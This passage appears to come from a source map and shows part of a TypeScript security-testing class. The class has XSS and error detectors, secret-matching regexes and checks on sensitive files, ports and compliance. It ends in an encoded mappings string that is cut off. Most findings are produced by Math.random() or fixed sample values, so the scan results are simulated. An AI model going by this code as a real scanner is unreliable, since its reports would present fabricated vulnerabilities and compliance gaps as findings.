indicators.some(indicator => responseText.includes(indicator.toLowerCase()));\r\n  }\r\n\r\n  private detectXSSVulnerability(response: AxiosResponse, payload: string): boolean {\r\n    const responseText = response.data?.toString() || '';\r\n    return responseText.includes(payload) && !responseText.includes('&lt;script&gt;');\r\n  }\r\n\r\n  private detectInputValidationIssue(response: AxiosResponse): boolean {\r\n    const errorIndicators = [\r\n      'stack trace',\r\n      'internal server error',\r\n      'exception',\r\n      'error 500'\r\n    ];\r\n    \r\n    const responseText = response.data?.toString().toLowerCase() || '';\r\n    return errorIndicators.some(indicator => responseText.includes(indicator));\r\n  }\r\n\r\n  private isVulnerablePackage(pkg: string, version: string): boolean {\r\n    // This would integrate with vulnerability databases\r\n    // For simulation, we'll flag some common vulnerable patterns\r\n    const vulnerablePatterns = [\r\n      { name: 'lodash', versions: ['4.17.20', '4.17.19'] },\r\n      { name: 'axios', versions: ['0.21.0'] },\r\n      { name: 'express', versions: ['4.17.0'] }\r\n    ];\r\n    \r\n    return vulnerablePatterns.some(pattern => \r\n      pattern.name === pkg && pattern.versions.includes(version)\r\n    );\r\n  }\r\n\r\n  private async scanForHardcodedSecrets(file: string): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // This would scan actual files for secrets\r\n    // For simulation, we'll create sample findings\r\n    const secretPatterns = [\r\n      /password\\s*=\\s*[\"'][^\"']+[\"']/i,\r\n      /api_key\\s*=\\s*[\"'][^\"']+[\"']/i,\r\n      /secret\\s*=\\s*[\"'][^\"']+[\"']/i\r\n    ];\r\n    \r\n    // Simulate finding hardcoded secrets\r\n    if (file.includes('.env') && Math.random() > 0.8) {\r\n      findings.push({\r\n        id: crypto.randomUUID(),\r\n        type: 'HARDCODED_SECRET',\r\n        severity: 'CRITICAL',\r\n        description: 'Hardcoded secret detected in configuration file',\r\n        location: file,\r\n        evidence: 'API_KEY=sk-1234567890abcdef',\r\n        remediation: 'Use environment variables for secrets'\r\n      });\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanForInsecureConfigurations(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check for common insecure configurations\r\n    const insecureConfigs = [\r\n      { key: 'DEBUG', value: 'true', severity: 'MEDIUM' as const },\r\n      { key: 'SSL_VERIFY', value: 'false', severity: 'HIGH' as const },\r\n      { key: 'CORS_ORIGIN', value: '*', severity: 'MEDIUM' as const }\r\n    ];\r\n    \r\n    for (const config of insecureConfigs) {\r\n      findings.push({\r\n        id: crypto.randomUUID(),\r\n        type: 'INSECURE_CONFIG',\r\n        severity: config.severity,\r\n        description: `Insecure configuration: ${config.key}=${config.value}`,\r\n        location: 'Configuration',\r\n        evidence: `${config.key}=${config.value}`,\r\n        remediation: `Secure the ${config.key} configuration`\r\n      });\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanFilePermissions(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // This would check actual file permissions\r\n    // For simulation, we'll create sample findings\r\n    const riskyFiles = ['.env', 'private.key', 'config.json'];\r\n    \r\n    for (const file of riskyFiles) {\r\n      if (Math.random() > 0.7) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'FILE_PERMISSIONS',\r\n          severity: 'MEDIUM',\r\n          description: `File ${file} has overly permissive permissions`,\r\n          location: file,\r\n          evidence: 'File permissions: 644 (should be 600)',\r\n          remediation: `Change permissions of ${file} to 600`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanForSensitiveFiles(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    const sensitiveFiles = [\r\n      '.git/config',\r\n      'backup.sql',\r\n      'debug.log',\r\n      '.DS_Store'\r\n    ];\r\n    \r\n    for (const file of sensitiveFiles) {\r\n      if (Math.random() > 0.8) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SENSITIVE_FILE',\r\n          severity: 'LOW',\r\n          description: `Sensitive file detected: ${file}`,\r\n          location: file,\r\n          evidence: `File ${file} contains sensitive information`,\r\n          remediation: `Remove or secure ${file}`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkOWASPCompliance(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check OWASP Top 10 compliance\r\n    const owaspChecks = [\r\n      'Injection vulnerabilities',\r\n      'Broken authentication',\r\n      'Sensitive data exposure',\r\n      'XML external entities',\r\n      'Broken access control'\r\n    ];\r\n    \r\n    for (const check of owaspChecks) {\r\n      if (Math.random() > 0.6) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'OWASP_COMPLIANCE',\r\n          severity: 'HIGH',\r\n          description: `OWASP compliance issue: ${check}`,\r\n          location: 'Application',\r\n          evidence: `${check} not properly addressed`,\r\n          remediation: `Implement controls for ${check}`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkISO27001Compliance(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check ISO 27001 compliance\r\n    const iso27001Checks = [\r\n      'Access control policy',\r\n      'Incident management',\r\n      'Risk assessment',\r\n      'Security monitoring'\r\n    ];\r\n    \r\n    for (const check of iso27001Checks) {\r\n      if (Math.random() > 0.7) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'ISO27001_COMPLIANCE',\r\n          severity: 'MEDIUM',\r\n          description: `ISO 27001 compliance gap: ${check}`,\r\n          location: 'Security Management',\r\n          evidence: `${check} not documented or implemented`,\r\n          remediation: `Implement and document ${check}`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkSOC2Compliance(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check SOC 2 compliance\r\n    const soc2Checks = [\r\n      'Security controls',\r\n      'Availability controls',\r\n      'Processing integrity',\r\n      'Confidentiality controls'\r\n    ];\r\n    \r\n    for (const check of soc2Checks) {\r\n      if (Math.random() > 0.8) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SOC2_COMPLIANCE',\r\n          severity: 'MEDIUM',\r\n          description: `SOC 2 compliance issue: ${check}`,\r\n          location: 'Compliance Framework',\r\n          evidence: `${check} not adequately implemented`,\r\n          remediation: `Strengthen ${check} implementation`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanOpenPorts(): Promise<number[]> {\r\n    // This would perform actual port scanning\r\n    // For simulation, return common ports\r\n    return [22, 80, 443, 3000, 5432, 6379];\r\n  }\r\n\r\n  private isUnnecessaryPort(port: number): boolean {\r\n    const necessaryPorts = [22, 80, 443]; // SSH, HTTP, HTTPS\r\n    return !necessaryPorts.includes(port);\r\n  }\r\n\r\n  private async testBusinessLogicFlaws(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Simulate business logic testing\r\n    const logicFlaws = [\r\n      'Price manipulation vulnerability',\r\n      'Race condition in order processing',\r\n      'Insufficient authorization checks'\r\n    ];\r\n    \r\n    for (const flaw of logicFlaws) {\r\n      if (Math.random() > 0.8) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'BUSINESS_LOGIC',\r\n          severity: 'HIGH',\r\n          description: `Business logic flaw: ${flaw}`,\r\n          location: 'Application Logic',\r\n          evidence: `${flaw} detected during testing`,\r\n          remediation: `Fix ${flaw} in application logic`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async testSessionManagement(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Simulate session management testing\r\n    const sessionIssues = [\r\n      'Session fixation vulnerability',\r\n      'Insufficient session timeout',\r\n      'Weak session token generation'\r\n    ];\r\n    \r\n    for (const issue of sessionIssues) {\r\n      if (Math.random() > 0.7) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SESSION_MANAGEMENT',\r\n          severity: 'MEDIUM',\r\n          description: `Session management issue: ${issue}`,\r\n          location: 'Session Management',\r\n          evidence: `${issue} detected`,\r\n          remediation: `Fix ${issue} in session handling`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkSocialEngineeringVulnerabilities(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check for social engineering vulnerabilities\r\n    const socialEngVulns = [\r\n      'No security awareness training',\r\n      'Weak password policies',\r\n      'No multi-factor authentication'\r\n    ];\r\n    \r\n    for (const vuln of socialEngVulns) {\r\n      if (Math.random() > 0.6) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SOCIAL_ENGINEERING',\r\n          severity: 'MEDIUM',\r\n          description: `Social engineering vulnerability: ${vuln}`,\r\n          location: 'Human Factors',\r\n          evidence: `${vuln} increases social engineering risk`,\r\n          remediation: `Address ${vuln} through policy and training`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private generateVulnerabilityReport(results: SecurityTestResult[]): VulnerabilityReport {\r\n    const allFindings = results.flatMap(r => r.findings);\r\n    \r\n    const criticalCount = allFindings.filter(f => f.severity === 'CRITICAL').length;\r\n    const highCount = allFindings.filter(f => f.severity === 'HIGH').length;\r\n    const mediumCount = allFindings.filter(f => f.severity === 'MEDIUM').length;\r\n    const lowCount = allFindings.filter(f => f.severity === 'LOW').length;\r\n    \r\n    // Calculate compliance score (0-100)\r\n    const totalTests = results.length;\r\n    const passedTests = results.filter(r => r.status === 'PASS').length;\r\n    const complianceScore = Math.round((passedTests / totalTests) * 100);\r\n    \r\n    const recommendations = [\r\n      ...new Set(results.flatMap(r => r.recommendations))\r\n    ];\r\n\r\n    return {\r\n      scanId: crypto.randomUUID(),\r\n      timestamp: new Date(),\r\n      totalVulnerabilities: allFindings.length,\r\n      criticalCount,\r\n      highCount,\r\n      mediumCount,\r\n      lowCount,\r\n      vulnerabilities: allFindings,\r\n      complianceScore,\r\n      recommendations\r\n    };\r\n  }\r\n\r\n  private createErrorTestResult(\r\n    testId: string, \r\n    testName: string, \r\n    error: any\r\n  ): SecurityTestResult {\r\n    return {\r\n      testId,\r\n      testName,\r\n      category: 'API_SECURITY',\r\n      status: 'FAIL',\r\n      severity: 'HIGH',\r\n      description: `Test failed due to error: ${error.message}`,\r\n      findings: [{\r\n        id: crypto.randomUUID(),\r\n        type: 'TEST_ERROR',\r\n        severity: 'HIGH',\r\n        description: `Test execution failed: ${error.message}`,\r\n        location: 'Test Framework',\r\n        evidence: error.stack || error.message,\r\n        remediation: 'Fix test execution error and retry'\r\n      }],\r\n      recommendations: ['Fix test execution error', 'Review test configuration'],\r\n      timestamp: new Date(),\r\n      executionTime: 0\r\n    };\r\n  }\r\n\r\n  /**\r\n   * Get test results\r\n   */\r\n  getTestResults(): SecurityTestResult[] {\r\n    return [...this.testResults];\r\n  }\r\n\r\n  /**\r\n   * Clear test results\r\n   */\r\n  clearTestResults(): void {\r\n    this.testResults = [];\r\n  }\r\n}"],"mappings":"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